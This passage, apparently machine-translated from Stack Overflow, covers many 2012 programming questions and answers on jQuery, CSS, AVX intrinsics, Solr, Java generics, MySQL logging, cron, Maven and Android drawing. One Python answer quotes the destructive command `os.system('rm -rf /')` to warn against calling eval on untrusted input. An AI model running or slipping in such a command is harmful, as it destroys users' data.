正如我所怀疑的那样，Flex 会用另一个覆盖一个，所以提交的所有内容都是“房间”。是否可以传递具有相同名称的两个参数？（或者我需要让服务器人员重命名他们的搜索参数吗？）

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T19:10:39.353

你不能。它只会覆盖以前的值：

```
param.query = pQuery;
param.searchFor = "teachers";
param.searchFor = "rooms";    //Will obviously override the previous value
searchUsersService(param); 
```

你可以做的是：

```
param.searchFor = [ "teachers", "rooms" ]; 
```

或者

```
param.searchFor = new ArrayCollection();
param.searchFor.add( "teachers" );
param.searchFor.add( "rooms" ); 
```

然后在服务器端，您可以从数组中获取所有值。

# javascript - 单击容器时制作复选框

> ID：13845802
> 
> 赞同：1
> 
> 时间：2012-12-12T17:58:29.800
> 
> 标签：javascript, jquery, html

我有一个包含复选框的 div 元素，当我单击 div 时，我希望复选框切换。我通过将以下代码分配给 $(#div).click 来做到这一点：

```
$(this).find(":checkbox").prop("checked", !$(this).find(":checkbox").prop("checked")); 
```

现在的问题是，如果单击复选框本身，上面的代码仍然会执行，因此复选框保持在相同的状态。我将如何解决这个问题？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-12T18:01:14.810

事件正在冒泡，您需要停止事件传播，一种方法是

```
$('#myDiv :checkbox').click(function(e){
    e.stopPropagation();
}); 
```

## 编辑

如果您想在 div 处理事件，请使用此

```
$('div').click(function(e) {

    // check if the event was triggered by an input box
    if (e.target.nodeName != "INPUT") {
        $(this).find(":checkbox").prop("checked", !$(this).find(":checkbox").prop("checked"));
    }

    // do something else 
    alert('hey there!');

});​ 
```

演示 - [http://jsfiddle.net/QnbhX/](http://jsfiddle.net/QnbhX/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-12T18:01:52.413

div 元素的 onclick()，附加一个切换复选框输出的 javascript 函数。这不是更简单的方法吗？

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-12T18:02:07.923

您应该使用更好的选择器，例如：

```
$('#myDiv').find(":checkbox").prop("checked", !$(this).find(":checkbox").prop("checked")); 
```

# android - 将实时视频流式传输到视图

> ID：13845803
> 
> 赞同：1
> 
> 时间：2012-12-12T17:58:30.003
> 
> 标签：android

我需要将实时视频从 IP 摄像机流式传输到视图。可以肯定的是，有一些应用程序可以做到这一点，但我需要在我自己的应用程序中做到这一点。

网上有使用 VideoView 和 MediaPlayer 执行此操作的简单示例，但这些都不起作用，至少对于我正在使用的 Panasonic 相机。在模拟器中运行，我可以看到 Android 向摄像头发送 RTSP DESCRIBE 请求，收到响应，然后简单地停止。VNC 继续执行 SETUP 和 PLAY 请求。

如果我有办法控制 rtsp 对话框，解决这个问题就很容易了，但我看不到任何方法可以使用 ViedoView 或 MediaPlayer 达到如此低的水平。有没有办法做到这一点？

谢谢。

# css - CSS 代码组织技术

> ID：13845804
> 
> 赞同：1
> 
> 时间：2012-12-12T17:58:33.420
> 
> 标签：css

这可能是一个边缘问题，因为我不确定是否有正确的答案，但我很好奇人们如何组织他们的样式表，以及是否有一种常见的做法。我确信这取决于个人风格，但我仍然想看看有些人的不同之处。

全局样式总是在顶部，其余样式一般按照它们在页面上出现的顺序编写。

我倾向于缩进父类下的所有子样式、子类和伪类：

```
#search {
    float:right;
    margin-top:20px;
    width:325px;
    height:35px;

    background-image:url(css-ref/main.png);
    background-repeat:no-repeat;

    text-align:right;
    line-height:36px;
    font-size:13px;
}
    #search a:link,#search a:visited,#search a:active {
        color:#333;
    }
    #search a:hover {
        color:#1770a9;
    } 
```

在一个类中，我总是按以下顺序列出属性：

```
.myClass {
    [position, display, and float]
    [margins and padding]
    [width and height]
    [background, border, border-style, shadow]
    [font settings]
    [animations/transitions]
} 
```

对我来说，这提高了可读性，因为如果我需要遍历并找到特定类中的属性，事情总是会按照相同的顺序进行。

是否有更好/更被接受的方式来组织样式表？你怎么做呢？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-12T18:33:41.167

这是一个不错的方法。仅供参考，我发现缩进代码没有额外的可读性。因此我没有。[http://www.visibilityinherit.com/code/initial-css-settings.php](http://www.visibilityinherit.com/code/initial-css-settings.php)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-12T18:03:55.150

标识或“嵌套”是一种常见的做法，并且是 CSS 元语言（如[SASS](http://sass-lang.com/docs/yardoc/file.SASS_REFERENCE.html#nested_rules) ）的一个关键特性。

# sse - 如何将 __m256d 中的所有元素设置为另一个 __m256d 的第三个元素？

> ID：13845806
> 
> 赞同：3
> 
> 时间：2012-12-12T17:58:38.510
> 
> 标签：sse, avx

使用 4 个打包`float`( `__m128`)，我可以使用 SSE 内在函数

```
__m128 X;
__m128 H = _mm_shuffle_ps(X,X,_MM_SHUFFLE(3,3,3,3)); 
```

将所有元素设置`H`为第三个元素`X`（这是最快的方法吗？）

现在，我想对 4 个打包`double`( `__m256d`) 做同样的事情。我天真地编码

```
__m256d X;
__m256d H = _mm256_shuffle_pd(X,X,_MM_SHUFFLE(3,3,3,3)); 
```

但这不正确！相反，它设置 H={X[1],X[1],X[3],X[3]}。

那么，怎么做才对呢？

**编辑**

使用 Intel(R) Xeon(R) CPU E5-2670 0 @ 2.60GHz

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-21T21:41:08.737

它并不总是最佳的，但询问你的编译器它认为什么可能是一个很好的提示。

```
#include <x86intrin.h>
__m256d f(__m256d x){
  __m256i m={3,3,3,3};
  return __builtin_shuffle(x,m);
} 
```

使用 gcc-4.8，这会生成：

```
vpermilpd   $15, %ymm0, %ymm0
vperm2f128  $17, %ymm0, %ymm0, %ymm0 
```

clang 有一个不同的内置用于改组，我不知道其他编译器是否有一些东西。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-12T20:09:50.940

好的，在 Mystical 的评论之后，我可以自己解决：

```
template<int K>
inline __mm256d pick_single(__m256d x)
{
   __m256 t = _mm256_permute2f128_pd(x,x, K&2?49:32);
   return _mm256_permute_pd(t,K&1?15:0);
} 
```

产生预期的结果。感谢您的帮助，神秘！

# ruby-on-rails - rails solr search 限制总搜索结果/获得固定数量的结果

> ID：13845807
> 
> 赞同：5
> 
> 时间：2012-12-12T17:58:40.473
> 
> 标签：ruby-on-rails, search, solr, sunspot-rails, sunspot-solr

我正在尝试执行搜索，随机排序结果，并且只返回一些结果，而不是所有匹配项。像 limit(2) 我试过使用 Solr 参数'rows'，但这似乎没有做任何事情：

```
@featured_articles = Article.search do 
  with(:is_featured, true)
  order_by :random
  adjust_solr_params do |params|
    params[:rows] = 2
  end
end 
```

@featured_articles.total 应该是 2，但它返回超过 2

如何获得随机固定数量的结果？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-14T18:31:34.860

Rather than adjusting params, just add a line:

```
order_by :random
rows :2 
```

See here: [http://wiki.apache.org/solr/CommonQueryParameters](http://wiki.apache.org/solr/CommonQueryParameters)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-21T14:33:09.943

所有红宝石示例..

```
@featured_articles = Article.search do 
  with(:is_featured, true)
  order_by :random
end.shuffle.take(2) 
```

如果您不需要 Solr，根据您的数据库，您还可以执行以下操作：`Article.where(is_featured: true).order("RANDOM()").limit(2)`

# java - Java 避免分层 Builder 模式中的类强制转换警告

> ID：13845812
> 
> 赞同：4
> 
> 时间：2012-12-12T17:59:13.870
> 
> 标签：java, generics

有没有办法避免这种分层构建器模式中的未经检查的类强制转换？

```
public abstract class BaseBuilder <T, B extends BaseBuilder<T,B>> {

  public B setB1(String b1) {
    this.b1 = b1;
    return (B) this; // can I make this unchecked cast go away?
  }

  abstract public T build();

  String b1;
} 
```

不，答案不是：

```
return B.class.cast(this); 
```

是的，我知道我可以使用@SuppressWarnings

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-12T22:45:15.060

如前所述，这是无法做到的，因为它不安全。`B`扩展`BaseBuilder<T,B>`，但`BaseBuilder<T,B>`（类型`this`）不扩展`B`。递归边界在 Java 中几乎从来没有用过，并且不给你 self 类型。你应该摆脱它。

您可以添加一个抽象方法，以便实现类必须提供以下实例`B`：

```
public abstract class BaseBuilder <T, B> {

  abstract public B getB();

  public B setB1(String b1) {
    this.b1 = b1;
    return getB();
  }

  abstract public T build();

  String b1;
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-12T18:05:30.933

是的; return`BaseBuilder<T, B>`并强制子类覆盖`setB1`以返回自己。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-12T18:12:11.160

除了路易斯所说的之外，以下是一个不错的设计：

```
public abstract class BaseBuilder ... {
    ...
    public B setB1(String b1) {
        this.b1 = b1;
        return self();
    }

    abstract protected B self();
    ...
}

public class SomeBuilder extends BaseBuilder ... {
    @override
    protected SomeBuilder self() {
        return this;
    }
} 
```

# mysql - 记录mysql查询将不起作用

> ID：13845813
> 
> 赞同：1
> 
> 时间：2012-12-12T17:59:15.397
> 
> 标签：mysql

我在 Ubuntu 上运行，我用以下内容修改 [了 /etc/mysql/my.cnf：my.cnf](http://pastie.org/5516923#69-70)的馅饼，我把它改成 mysql:mysql 并将它改成 777。不管我尝试什么运行一些查询没有任何记录。我究竟做错了什么？我也尝试过注释掉 general_log_file 和 general_log 并使用 log = 和它是一样的。

更新：我确实在更改后重新启动了 mysql。更新：这里是mysql变量： http: [//pastie.org/5517087](http://pastie.org/5517087)

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2012-12-12T18:01:44.417

我建议您检查以下内容：

1）确保您重新启动了服务，并且在重新启动过程中没有出现错误，无论是在命令提示符下，还是在 mysql 错误日志文件中

2）在您的 my.cnf 中，您正在使用：

```
general_log_file = /var/www/logs/mysql-query.log 
```

确保用户 mysqld（或任何运行 mysql 服务的用户）具有写入此文件夹的适当权限。/var/www/ 文件夹通常用于 apache，而不是 mysql，所以我建议 /var/log/ 或 /var/log/mysqld

3) 确保您正在编辑的 my.cnf 是您的 mysqld 真正运行的那个。在许多情况下，当您使用其他一些软件（如 cpanel、plesk 等）时，不会使用默认文件夹，而正在使用的配置在其他地方。您可以使用以下命令在系统中搜索其他 my.cnf：

```
locate my.cnf 
```

# machine-learning - 决策树（例如 C4.5）是否被视为非参数学习？

> ID：13845816
> 
> 赞同：9
> 
> 时间：2012-12-12T17:59:23.277
> 
> 标签：machine-learning, decision-tree

我对机器学习相对较新，并且正在尝试将决策树归纳纳入事物的宏伟计划中。决策树（例如，使用 C4.5 或 ID3 构建的决策树）是否被视为参数或非参数？我猜想它们可能确实是参数化的，因为实际值的决策分割点可能是从特征值的某些分布中确定的，例如均值。但是，它们不具有必须保留所有原始训练数据的非参数特征（就像使用 kNN 所做的那样）。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-12-12T18:37:58.250

术语“参数”是指定义数据分布的参数。由于 C4.5 等决策树不对数据的分布做出假设，因此它们是非参数的。高斯最大似然分类 (GMLC) 是参数化的，因为它假设数据遵循多元高斯分布（类由均值和协方差表征）。关于你的最后一句话，保留训练数据（例如，基于实例的学习）并不是所有非参数分类器都通用的。例如，人工神经网络 (ANN) 被认为是非参数的，但它们不保留训练数据。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2019-06-01T21:02:50.583

术语参数是指模型的参数数量与数据之间的关系。

如果参数的数量是固定的，则模型是参数化的。

如果参数的数量随着数据的增长而增长，则模型是非参数的。

决策树是非参数的，但如果你限制它的大小以进行正则化，那么参数的数量也会被限制并且可以被认为是固定的。因此，决策树并不是那么明确。

KNN 绝对是非参数的，因为参数集就是数据集：要预测新的数据点，KNN 模型需要访问训练数据点，而无需访问其他任何东西（超参数 K 除外）。

# php - 他们仪表板中的 WordPress 新闻，怎么样？

> ID：13845818
> 
> 赞同：0
> 
> 时间：2012-12-12T17:59:30.443
> 
> 标签：php, javascript

我的问题是 wordpress 究竟是如何将他们的“新闻”内容拉入每个仪表板的？我想在我的脚本中实现类似的概念，但我不认为 get_file_contents() 是最佳选择。我最好的选择是什么？我在考虑使用 javascript，但据我了解，您不能在其他域上发出请求？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-12T18:00:53.843

> 我在考虑使用 javascript，但据我了解，您不能在其他域上发出请求？

您可以通过 JSONP。[http://en.wikipedia.org/wiki/JSONP](http://en.wikipedia.org/wiki/JSONP)

# bash - 如何自动运行 crons？

> ID：13845819
> 
> 赞同：1
> 
> 时间：2012-12-12T17:59:33.390
> 
> 标签：bash, cron, centos

我正在尝试让 crontab 自动运行一个文件，内容如下：

```
SHELL=/bin/bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin
MAILTO=root
HOME=/

*/5 * * * * php /path/to/script 
```

我已将此文件调用`prod.cron`到`/etc/cron.d`文件夹中，但似乎无法让它自己运行。通过命令行直接运行脚本表明它工作正常，但不确定 cron.d 中的文件是否被自动检测到或者我需要做其他事情来初始化它们？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-12T19:41:56.287

请注意，目录`/etc/cron.d`是供软件包使用的，crontabs 应该安装到用户的 crontab 中。话虽如此，请查看以下[Cron 问题](http://livecronjobs.com/)：

> 1.  该脚本没有执行权限。使用 chmod a+x 提供权限。
> 2.  在 php、perl 或其他脚本语言的情况下，解释器或程序的路径不正确。在定义要在 cron 中运行的命令时，始终提供解释器的实际路径。要找出程序所在的位置，请使用 whereis 命令。例如对于 php，whereis php。对于 perl，whereis php 等。
> 3.  运行脚本所需的环境变量不可用。cron 不使用与用户相同的环境。它在运行命令时使用自己的环境。所以 .login 或 .profile 中定义的变量对他来说是不可见的。最常见的问题与不相似的 PATH 变量有关。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-12T19:58:54.023

cron 文件有两种风格。

安装在下面的文件`/etc/cron.d`是*系统*cron 文件。他们要求每行的第 6 个字段是用于运行命令的用户帐户。`/etc/cron.d`有关示例，请参见下面的其他文件。

非系统 cron 文件只有通常的 5 个字段来指定作业何时运行，然后是运行命令。它们由命令安装`crontab`，由将运行命令的用户帐户执行。这*可能*是您想要使用的。

要么添加`root`为相关行的第 6 个字段，要么`crontab prod.cron`以 root 身份运行（或作为应运行命令的任何帐户）。

当然要确保`php`命令在指定的`$PATH`.

# javascript - 调用原型函数 - 不起作用

> ID：13845824
> 
> 赞同：0
> 
> 时间：2012-12-12T17:59:48.380
> 
> 标签：javascript, function

嗨，我有以下代码可以控制图片库的位置（可以在 steven.tlvweb.com 上看到）。滚轮当前控制画廊位置，但 keydown 事件不控制，我希望他们这样做。可以看到下面代码中的警报（keyLeft 和 keyRight），但根本没有调用**this.parent.scroll 。**

参数 sc 只需要是一个正整数或负整数 - 毕竟 event.wheelDelta 是什么所以我想知道，调用这个原型函数的正确方法是什么？

```
/* //////////// ==== ImageFlow Constructor ==== //////////// */

function ImageFlow(oCont, xmlfile, horizon, size, zoom, border, start, interval) {
    this.oc = document.getElementById(oCont); 
this.scrollbar  = getElementsByClass(this.oc,   'div', 'scrollbar');
this.text       = getElementsByClass(this.oc,   'div', 'text');
this.bar        = getElementsByClass(this.oc,   'img', 'bar');
this.arL        = getElementsByClass(this.oc,   'img', 'arrow-left');
this.arR        = getElementsByClass(this.oc,   'img', 'arrow-right');
    this.bar.parent = this.oc.parent = this; 
    this.arL.parent = this.arR.parent = this;

    /* === handle mouse scroll wheel === */
    this.oc.onmousewheel = function () {
        this.parent.scroll(event.wheelDelta);
        return false;
    }

    var pleasework = this;

/* ==== add keydown events ==== */
    window.document.onkeydown=function(){  
        pleasework.keypress(event.keyCode);
        return false;
    }

}
/* //////////// ==== ImageFlow prototype ==== //////////// */
ImageFlow.prototype = {

scroll: function (sc) {
        if (sc < 0) {
            if (this.view < this.NF - 1) this.calc(1);
        } else {
            if (this.view > 0) this.calc(-1);
        }
    },

keypress : function (kp) {

    switch (kp) {
        case 39:
            //right Key
            if (this.view < this.NF - 1) this.calc(1);
            break;
        case 37:
            //left Key
            if (this.view > 0) this.calc(-1);
            break;
    }

    },

} 
```

在此先感谢 Steven（Java 新手程序员）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-12T21:43:50.757

不要`parent`在 DOM 元素上使用该属性。相反，只需在局部变量上创建一个闭包。所以，更换

```
this.bar.parent = this.oc.parent = this; 
this.arL.parent = this.arR.parent = this;

/* === handle mouse scroll wheel === */
this.oc.onmousewheel = function () {
    this.parent.scroll(event.wheelDelta);
    return false;
}

/* ==== add keydown events ==== */
window.document.onkeydown=function(){  
    this.parent.keypress(event.keyCode);
    return false;
} 
```

和

```
var parent = this;
this.oc.onmousewheel = function(e) {
    parent.scroll(e.wheelDelta);
    e.preventDefault();
};
window.document.onkeydown = function(e) { // notice this overwrites previous listeners
    parent.keypress(e.keyCode);
}; 
```

# maven - exec-maven-plugin 不评估 正确依赖

> ID：13845826
> 
> 赞同：2
> 
> 时间：2012-12-12T18:00:11.597
> 
> 标签：maven, classpath, dependency-management

**上下文**：我有一个调用可执行文件（它恰好是一个 Groovy 脚本，但没关系）的 Maven 目标，它需要作为参数作为运行时库的路径（它恰好是一个 JDBC 驱动程序，但它没有也没关系）。

我没有对驱动程序的路径进行硬编码，而是将其构建为`classpath dependency`，以便从 Maven 存储库的任何位置选择它（我们有不同的环境和不同的操作系统）。

```
<classpath>
    <dependency>postgresql:postgresql</dependency> <!-- groupId:artifactId -->
</classpath> 
```

**问题**：类路径没有按预期解析，而不是库的路径，它是空的（因此调用失败）。

pom.xml 的相关部分如下：

```
<dependency>
  <groupId>postgresql</groupId>
  <artifactId>postgresql</artifactId>
  <version>9.1-901.jdbc4</version>
  <scope>provided</scope>
</dependency>

<plugin>
  <groupId>org.codehaus.mojo</groupId>
  <artifactId>exec-maven-plugin</artifactId>
  <version>1.2.1</version>
  <executions>
    <execution>
      <id>initialize-rule-plugin</id>
      <phase>compile</phase>
        <goals><goal>exec</goal></goals>
        <configuration>
          <executable>full\path\to\groovy</executable>
          <arguments>
            <argument>-cp</argument>
              <classpath>
                <dependency>postgresql:postgresql</dependency>
              </classpath>
            <argument>myscript.groovy</argument>
          </arguments>
        </configuration>
      </execution>
  </executions>
</plugin> 
```

调试输出为：

```
[DEBUG] Configuring mojo 'org.codehaus.mojo:exec-maven-plugin:1.2.1:exec' with basic configurator -->
[DEBUG]   (s) dependency = postgresql:postgresql
[DEBUG]   (f) arguments = [-cp, Classpath { postgresql:postgresql}, ]
[...]
[DEBUG] Collected project artifacts [org.springframework:spring-context:jar:3.1.2.RELEASE:compile, org.springframework:spring-aop:jar:3.1.2.RELEASE:compile, org.springframework:spring-beans:jar:3.1.2.RELEASE:compile, org.springframework:spring-core:jar:3.1.2.RELEASE:compile, org.springframework:spring-expression:jar:3.1.2.RELEASE:compile, org.springframework:spring-asm:jar:3.1.2.RELEASE:compile, org.springframework:spring-webmvc:jar:3.1.2.RELEASE:compile, org.springframework:spring-context-support:jar:3.1.2.RELEASE:compile, org.springframework:spring-web:jar:3.1.2.RELEASE:compile, org.springframework:spring-tx:jar:3.1.2.RELEASE:compile, aopalliance:aopalliance:jar:1.0:compile, org.springframework:spring-orm:jar:3.1.2.RELEASE:compile, org.springframework:spring-jdbc:jar:3.1.2.RELEASE:compile, org.slf4j:slf4j-api:jar:1.7.1:compile, org.slf4j:jcl-over-slf4j:jar:1.7.1:runtime, org.slf4j:slf4j-log4j12:jar:1.7.1:runtime, log4j:log4j:jar:1.2.17:compile, javax.validation:validation-api:jar:1.0.0.GA:compile, org.hibernate:hibernate-validator:jar:4.3.0.Final:compile, org.jboss.logging:jboss-logging:jar:3.1.0.CR2:compile, org.hibernate:hibernate-entitymanager:jar:4.1.7.Final:compile, org.jboss.spec.javax.transaction:jboss-transaction-api_1.1_spec:jar:1.0.0.Final:compile, dom4j:dom4j:jar:1.6.1:compile, org.javassist:javassist:jar:3.15.0-GA:compile, org.hibernate:hibernate-core:jar:4.1.7.Final:compile, antlr:antlr:jar:2.7.7:compile, org.hibernate.common:hibernate-commons-annotations:jar:4.0.1.Final:compile, org.hibernate.javax.persistence:hibernate-jpa-2.0-api:jar:1.0.1.Final:compile, org.codehaus.jackson:jackson-mapper-asl:jar:1.9.10:compile, org.codehaus.jackson:jackson-core-asl:jar:1.9.10:compile, javax.servlet:jstl:jar:1.2:compile, commons-dbcp:commons-dbcp:jar:1.4:compile, commons-pool:commons-pool:jar:1.5.4:compile, org.codehaus.groovy:groovy-all:jar:2.0.5:compile]
[DEBUG] Collected project classpath [C:\projects\myproject\target\classes]
[DEBUG] Toolchains are ignored, 'executable' parameter is set to c:\full\path\to\groovy
[DEBUG] Executing command line: cmd /c c:\full\path\to\groovy.bat -cp C:\projects\myproject\target\classes myscript.groovy 
```

可以看出，它没有获取驱动程序（存在）的类路径。

我已经尝试过在参考中包含和不包含依赖项的版本号。

先感谢您。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-14T13:36:28.080

根据我的评论，我找到了一种不同的方法来做同样的事情。由于没有发布其他解决方案，如果有人遇到同样的问题，我会将其发布为答案。

关键是使用不同的插件，它可以即时创建填充了 jar 路径的属性。

```
<plugin>
  <groupId>org.bitstrings.maven.plugins</groupId>
  <artifactId>dependencypath-maven-plugin</artifactId>
  <version>1.1.1</version>
  <executions>
    <execution>
      <id>set-all</id>
      <goals>
        <goal>set</goal>
      </goals>
    <configuration>
      <propertySets>
        <propertySet>
          <includes>
            <include>postgresql:postgresql:jar</include>
          </includes>
        </propertySet>
      </propertySets>
    </configuration>
    </execution>
  </executions>
</plugin>

[...]

<execution>
  <id>my-script</id>
  <phase>compile</phase>
  <goals>
    <goal>exec</goal>
  </goals>
  <configuration>
    <executable>path/to/groovy</executable>
    <arguments>
      <argument>-cp</argument>
      <argument>${postgresql:postgresql:jar}</argument>
      <argument>my-script.groovy</argument>
    </arguments>
  </configuration>
</execution> 
```

# python - make install 抛出 .ptk 相关错误

> ID：13845827
> 
> 赞同：0
> 
> 时间：2012-12-12T18:00:12.217
> 
> 标签：python, amazon-web-services, vtk

我正在尝试在我的 ubuntu 机器上安装 vtk 并将其与 python 一起使用。我安装了VTK，我能够配置和生成，然后我做了一个'sudo make install'，这给了我以下错误，我不确定必须设置哪个路径以及如何让python从中读取.pth文件那个文件夹，我对VTK和Python都是新手，所以任何建议都会有很大帮助。

谢谢， Shripad D

安装错误：

检查 /usr/local/lib/python2.7/site-packages/ /opt/bitnami/python/bin/.python2.7.bin -E -c pass TEST FAILED: /usr/local/lib 中的 .pth 文件支持/python2.7/site-packages/ 不支持 .pth 文件错误：安装目录或 PYTHONPATH 错误

您正在尝试将软件包安装到不在 PYTHONPATH 上且 Python 不会从中读取“.pth”文件的目录中。您指定的安装目录（通过 --install-dir、--prefix 或 distutils 默认设置）是：

```
/usr/local/lib/python2.7/site-packages/ 
```

并且您的 PYTHONPATH 环境变量当前包含：

```
'/opt/bitnami/apps/django/lib/python2.7/site-packages:/opt/bitnami/subversion/lib/svn-python::/opt/bitnami/apps/django/lib/python2.7/site-packages:/opt/bitnami/subversion/lib/svn-python::' 
```

以下是您解决问题的一些选项：

*   您可以选择不同的安装目录，即位于 PYTHONPATH 或支持 .pth 文件的安装目录

*   您可以将安装目录添加到 PYTHONPATH 环境变量中。（当你运行 Python 并想要使用你正在安装的包时，它也必须在 PYTHONPATH 上。）

*   您可以使用此处描述的方法之一设置安装目录以支持“.pth”文件：

    [http://packages.python.org/distribute/easy_install.html#custom-installation-locations](http://packages.python.org/distribute/easy_install.html#custom-installation-locations)

请对您的系统进行适当的更改，然后重试。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-14T19:09:27.980

看来您正在使用 BitNami（我认为您正在使用 BitNami Django Stack）。您可以尝试加载 BitNami 环境然后运行命令吗？

```
sudo /opt/bitnami/use_djangostack
cd /opt/bitnami
. scripts/setenv.sh 
```

在最后一个命令中，请注意点和脚本之间的空格。

# python - 如何制作两个具有值作为列表的字典键

> ID：13845830
> 
> 赞同：-6
> 
> 时间：2012-12-12T18:00:22.980
> 
> 标签：python, list, dictionary

```
Write1 [1.0]
Write1 [12.0]
Write1 ['C:/Users/san/Modeler/']
Write1 ['png']
Write1 ['rgb']
Write1 [True]
Write2 [1.0]
Write2 [1.0]
Write2 ['']
Write2 [' ']
Write2 ['rgb']
Write2 [False] 
```

我想做这样的字典 {'Write1':[1.0,12.0,'c:/path','png','rgb',True],'Write2':[1.0,1.0,'',' ', 'rgb',False]} 列表中的值来自 nuke.toNode(wNode)[eachAttrib].value() 这是我试图做的

```
attributes=[]
wnodeData={}
for wNode in writeNodes:
    for eachAttrib in ['first','last','file','file_type','channels','use_limit']:
        wnodeData[wNode]=attributes
        attributes.append(nuke.toNode(wNode)[eachAttrib].value()) 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-12T18:08:54.187

就像是：

```
text="""Write1 [1.0]
Write1 [12.0]
Write1 ['C:/Users/san/Modeler/']
Write1 ['png']
Write1 ['rgb']
Write1 [True]
Write2 [1.0]
Write2 [1.0]
Write2 ['']
Write2 [' ']
Write2 ['rgb']
Write2 [False]"""

from ast import literal_eval

d = {}
lines = text.splitlines()
for line in lines:
    k, v = line.split(' ', 1)
    val = literal_eval(v)[0]
    d.setdefault(k, []).append(val)

print d

# {'Write1': [1.0, 12.0, 'C:/Users/san/Modeler/', 'png', 'rgb', True], 'Write2': [1.0, 1.0, '', ' ', 'rgb', False]} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-12T18:08:08.117

```
import collections

s = '''Write1 [1.0]
Write1 [12.0]
Write1 ['C:/Users/san/Modeler/']
Write1 ['png']
Write1 ['rgb']
Write1 [True]
Write2 [1.0]
Write2 [1.0]
Write2 ['']
Write2 [' ']
Write2 ['rgb']
Write2 [False]'''

d = collections.defaultdict(list)
for line in s.split('\n'):
    print(line)
    key, val = line.split(' ', 1)
    d[key].append(val[1:-1])
print(d) 
```

显然，如果你有一个文本文件而不是一个字符串，你可以将 for 循环替换为：

```
with open('mystuff.txt', 'r') as f:
    for line in f: 
```

如果你想实际评估括号内的值（所以你得到一个浮点数`1.0`而不是字符串`'1.0'`，字符串`'png'`而不是字符串`"'png'"`等），你需要知道它们所用的语言并解析它。看起来它们是 Python 的一个子集，其中每一件事都是没有转义的单引号字符串文字、非指数格式的浮点文字或布尔文字，但我不会在不知道的情况下假设值来自哪里（我当然不会`eval`在不知道它们来自哪里的情况下直接调用它们，因为这样有人可以只保留`os.system('rm -rf /')`文本文件，然后您会对其进行评估。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-12T18:03:06.367

```
write1 = {'write1':[1,2,3,4] } 
```

应该管用 ...

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-12T18:03:31.057

使用默认值作为列表创建一个 defaultdict，然后开始附加（或使用其他列表方法）。

# android - Hexboard 上的 Android Laggy onDraw()

> ID：13845832
> 
> 赞同：0
> 
> 时间：2012-12-12T18:00:31.800
> 
> 标签：android, performance, lag, hexagonal-tiles

我一直在使用 android 中的六边形板开发棋盘游戏，但是当我移动棋盘时，整个“地图”或数十个实体开始滞后。我相信这是使用 for 循环的原因，但我不知道如何修复它。我用的是螺纹画法，不知道有没有影响。在棋盘上移动时，我可以清楚地看到手机上的滞后。

我的游戏课：

```
public class Game extends SurfaceView implements SurfaceHolder.Callback {
// Game Vars

int mapWidth = 150, mapHeight = 150;
public static double hexagonSideLength = 80;
public static double cellWidth = 2 * hexagonSideLength, cellHeight = Math
        .sqrt(3) * hexagonSideLength;
public static double downwardShift = (0.5) * (cellHeight);
public static double rightShift = hexagonSideLength / 2;
public static int boundaryWidth = 0, boundaryHeight = 0;
public static int error = (int) ((hexagonSideLength) * (0.06));
public static int buffer = 2;
public static int draws = 0;

// Touch Handle

// Offset to the upper left corner of the map
private int xOffset = 0;
private int yOffset = 0;

// last touch point
private int _xTouch = 0;
private int _yTouch = 0;

// scrolling active?
private boolean _isMoving = false;

public Cell[][] map;
private GameThread thread;
static String TAG = Game.class.getSimpleName();
Bitmap image[] = new Bitmap[100];
Paint paint;

public Game(Context context) {
    super(context);
    Log.i(TAG, "Loaded Game");
    // adding the callback (this) to the surface holder to intercept events
    getHolder().addCallback(this);
    // make the GamePanel focusable so it can handle events
    thread = new GameThread(getHolder(), this);
    map = new Cell[mapWidth][mapHeight]; // Create new Map
    boolean isShiftedDownwards = false;
    for (int i = 0; i < mapWidth; i++) {
        for (int j = 0; j < mapHeight; j++) {
            map[i][j] = new Cell(j, i, isShiftedDownwards);
        }
        if (isShiftedDownwards == true)
            isShiftedDownwards = false;
        else
            isShiftedDownwards = true;
    }

    if (mapWidth % 2 != 0) {
        boundaryWidth = (int) ((((mapWidth - 1) / 2) * hexagonSideLength)
                + ((mapWidth / 2) * cellWidth) + (2) * hexagonSideLength);
    } else {
        boundaryWidth = (int) (((((mapWidth - 1) / 2) * hexagonSideLength) + ((mapWidth / 2) * cellWidth)) + (1.5) * hexagonSideLength);
    }
    boundaryHeight = (int) (mapHeight * cellHeight + 0.5 * cellHeight);
    setFocusable(true);
    image[0] = Bitmap.createBitmap(BitmapFactory.decodeResource(
            this.getResources(), R.drawable.hexagonrgb));
    image[1] = Bitmap.createScaledBitmap(image[0], (int) cellWidth + error,
            (int) cellHeight + error, false);
    Log.i(TAG, "Got Resources");
    paint = new Paint();
    Log.i(TAG, "Prepared paint");

}

// called every Frame
@Override
protected void onDraw(Canvas canvas) {
    Log.i(TAG, "onDraw Called");
    // BG
    canvas.drawColor(Color.BLACK);

    // Resize

    // Redraw Map
    draws = 0;
    for (int column = updateArea(0); column < updateArea(1); column++) {
        for (int row = updateArea(2); row < updateArea(3); row++) {
            canvas.drawBitmap(image[1], map[column][row].x - xOffset,
                    map[column][row].y - yOffset, paint);
